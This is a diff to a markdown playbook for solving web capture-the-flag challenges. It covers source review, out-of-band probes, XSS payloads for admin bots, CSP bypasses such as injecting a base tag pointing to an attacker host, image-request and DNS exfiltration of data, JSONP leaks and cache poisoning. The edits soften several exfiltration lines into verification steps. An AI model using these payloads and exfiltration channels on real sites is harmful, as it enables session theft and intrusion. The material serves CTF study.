@@ -11,6 +11,7 @@ Treat a 429, repeated timeout, challenge reset, or temporary hide as a change in
 
 ## Source-first when source ships
 Map the supplied source quickly. If a target endpoint is supplied, check one normal response against it before expanding the analysis. When there is no endpoint, use a runnable local copy or the supplied code as the observation. Reading every file before the first observation or fuzzing blindly wastes time.
+For a multi-service or CI-backed target, use the supplied architecture and operating docs to sketch the shortest path from controlled input to the secret: actors, job identities, persistent mounts/caches, and which component produces or consumes each artifact. Check the trust boundary between components before expanding endpoint fuzzing. For an asynchronous action, preserve its job/session ID and follow trigger → status → result with a finite poll budget based on observed latency and rate limits; a pending job is not a failed payload.
 1. **Stack** from manifests: `requirements.txt`/`Pipfile`, `package.json`, `composer.json`, `Gemfile`, `go.mod`, framework imports, pinned versions (record in `notes/ANALYSIS.md` — version decides which gadget/escape works).
 2. **Routes → relevant handlers**; identify a reachable path toward the Flag, then follow its input and sink. Expand when an observation points to another path.
 3. **Compare nearby behavior when useful**: check how related handlers authorize, query, render, or deserialize. A deviation may be a clue, but the vulnerability need not be a one-line exception.
@@ -123,7 +124,7 @@ No reflection ≠ no bug. If an external callback is needed, use an available li
 |---|---|
 | Blind SSRF | any URL/host field, webhook config, PDF/HTML/image renderer, `url=`/`callback=` param |
 | Blind XXE | `<!DOCTYPE r [<!ENTITY x SYSTEM "http://OOB/">]>&x;`; param-entity + external DTD to exfil a file in the hostname/path |
-| Blind XSS / admin bot | store `"><script src=//OOB></script>` where a bot/admin renders it → capture `document.cookie`/token/DOM, then have it hit the flag page |
+| Blind XSS / admin bot | store a marker where a bot/admin renders it; confirm that bot's origin and account, then test which privileged DOM/API data and output channel are actually reachable (HttpOnly cookies are not readable with `document.cookie`) |
 
 ## Confirm the primitive against the live target (before escalating)
 Reflect a marker / trigger one observable, then escalate. Cache the working request as a function in `solver.py`.
@@ -135,7 +136,7 @@ Reflect a marker / trigger one observable, then escalate. Cache the working requ
 | Proto-pollution | probe payload, then read back a property you polluted before weaponizing |
 | Deserialize | benign gadget causing an observable (sleep/DNS) before the RCE gadget |
 | Path/LFI | `/etc/passwd` or `php://filter` base64 of a known file first |
-| XSS/bot | fire a marker `img.src=//OOB` before the real exfil — confirms your JS runs in the bot |
+| XSS/bot | use a unique marker through a channel allowed by the bot's CSP; a received callback confirms execution in that context, while no callback alone does not disprove it |
 
 ## Weaponization recipes (primitive → flag)
 
@@ -240,14 +241,14 @@ For double-spend, one-time token, or check-then-use behavior, confirm the state 
 - **Method swap**: try `TRACE`/`PUT`/`PATCH`/`HEAD`/arbitrary verb on a `403`d route.
 - **Source grep**: the one endpoint missing `@login_required`/`requireAuth`; all-zero/nil UUIDs or default admin id; predictable/sequential IDOR keys; a `/admin/login` that seeds a reusable admin cookie.
 
-## Client-side (XSS, admin bot, CSP) — flag lives in the bot's session
-**Bot model**: a report endpoint makes a headless (Puppeteer/Playwright) admin visit your URL *with the flag/cookie in its context*. Your job: run JS in that context (or leak scriptlessly) and exfil. Give the bot a URL you host (via cloudflared) or a stored-XSS injection. Solve any report-endpoint PoW. Reproduce the bot locally with `playwright`/`puppeteer` chromium; fuzz reflected/DOM sinks with `dalfox`.
+## Client-side (XSS, admin bot, CSP) — verify the bot's context
+**Bot model**: a report endpoint may launch a privileged browser, but its account, origin, cookies, navigation, and secret location vary. Observe that flow before choosing a payload. First confirm execution and readable data in that exact context; then choose an allowed output channel. If the report endpoint accepts a URL you control, or a stored-XSS path exists, test the smallest observable marker there. Solve any report-endpoint PoW. Reproduce the bot locally with `playwright`/`puppeteer` chromium when feasible; fuzz reflected/DOM sinks with `dalfox` only when evidence supports it.
 
 ### Get JS to run
 | Vector | Payload |
 |---|---|
 | Reflected/stored HTML sink | `<img src=x onerror=P>`, `<svg onload=P>`, `<script>P</script>`, `<body onload=P>` |
-| `new URL()` validates syntax not scheme | `javascript:P` (also `data:`,`blob:`) — runs in bot's navigation context, target CSP/SRI irrelevant |
+| `new URL()` validates syntax not scheme | URL parsing alone does not establish script execution. Test the actual navigation sink and browser policy: `javascript:` may be blocked by CSP, `data:` has an opaque origin, and `blob:` normally uses its creator origin. |
 | jQuery `$(location.hash)`/`$(userinput)` | `#<img src=x onerror=P>` (iframe `onload` to trigger `hashchange`) |
 | Content-Type from extension | upload/route `note.html` served `text/html` → HTML executes |
 | DOM clobbering (no JS filter) | `<form id=config><input name=isAdmin value=1>` clobbers `window.config.isAdmin` |
@@ -258,19 +259,19 @@ Filter bypass: case-mix `<ScRiPt>`, `<svg/onload=>`, template literal ``alert`1`
 ### Exfil channel (pick by CSP)
 1. `fetch`/XHR to your host — blocked by `connect-src`/`default-src`.
 2. `new Image().src='//OOB/?'+data` / `location=` / `<link rel=prefetch>` / `<meta http-equiv=refresh>` — governed by `img-src`/`prefetch-src`/navigation, so they leak when only `script-src`/`connect-src` is set.
-3. **DNS**: `new Image().src='http://'+btoa(flag)+'.OOB'` — the subdomain carries the data; survives even a restrictive `img-src` host if the DNS lookup itself fires.
+3. **DNS**: an encoded subdomain can carry data only if a uniquely tagged lookup is observed. `img-src`/`default-src` may block an image request before lookup; do not assume DNS bypasses CSP.
 4. **Self-upload / same-origin store**: fetch `/admin`, POST result back as a filename/note → read it yourself. Beats all egress filtering.
 
 ### CSP bypass ladder
 | CSP weakness | Bypass |
 |---|---|
 | missing `base-uri` + nonced relative `<script src=rel.js>` | inject `<base href=//attacker/>` — nonce still valid, src now yours |
-| whitelists a CDN (`cdnjs`, `unpkg`) | load **Alpine/htmx/hyperscript/AngularJS** from it → behavioral attrs `x-init`/`hx-get`/`_=`/`{{}}` run code sanitizers don't strip |
+| whitelists a CDN (`cdnjs`, `unpkg`) | test an allowed library only if it can load and the needed behavioral attributes survive filtering |
 | whitelists shared cloud (`*.run.app`,`*.cloudfunctions.net`) | host your JS there |
 | JSONP/`?callback=` endpoint on an allowed origin | XSSI: `<script src="/x.js?callback=leak">` wraps secret in your fn |
 | attacker-controlled MIME on same-origin reflect | `<script src="/reflect?...&type=application/javascript">` (nosniff doesn't override a declared type) |
 | `script-src` only, no `object`/`prefetch` limits | scriptless exfil via `<link rel=prefetch>`, `<meta refresh>` |
-| inline blocked but bot follows redirects | HTML-inject `<meta http-equiv=refresh url=//attacker/x.html>` → run JS freely off-origin |
+| inline blocked but bot follows redirects | an external page runs under its own origin and cannot read the target DOM/cookies; use a redirect only when a separate same-origin read or message bridge is demonstrated |
 
 ### Scriptless / CSS-only (strict CSP, `style-src` open)
 - `@font-face`+`unicode-range` per char → font fetch fires only for present chars (leaks char *set*).
@@ -283,8 +284,8 @@ Filter bypass: case-mix `<ScRiPt>`, `<svg/onload=>`, template literal ``alert`1`
 - Closed shadow DOM: `Element.prototype.attachShadow` Proxy to capture root; `(0,eval)` to escape `with()` scope.
 - Client HMAC/signing key hardcoded in JS → deobfuscate, call the leaked `sign()` in console to forge requests.
 
-### Cache poisoning
-Unkeyed header (`X-Forwarded-Host`, `X-Original-URL`) reflected into HTML + a cache that keys on URL only → one poisoned request serves your payload to every visitor incl. the bot. Registering a username/path ending `.js`/`.css`/`.svg` can flip a per-user page into a CDN-cached static asset → self-XSS becomes wormable stored XSS.
+### Cache state and poisoning
+When a cache is observed, compare its key and `Vary` inputs with the origin's authorization and object identity. Record TTL, `ETag`/`Last-Modified`, and what happens after an object is deleted, recreated, or reassigned. A conditional revalidation that returns `304` can cause the cache to reuse a stored body; test whether the validator still identifies the same authorized representation across generations. Separately, an unkeyed header reflected into a cacheable response or a per-user route treated as a static asset can make one user's content visible to another; prove the cache hit and recipient context with a harmless marker before pursuing the secret.
 
 ### Cross-origin plumbing
 Shared parent domain → set `domain=.site.tld` cookie from a sibling subdomain that reflects it → XSS on the target. `postMessage` handler that accepts `null`/empty origin → send from a `data:` or `sandbox`-only iframe. React-controlled inputs ignore `.value=`: use the native setter + dispatch `input`/`change` (for local form driving).
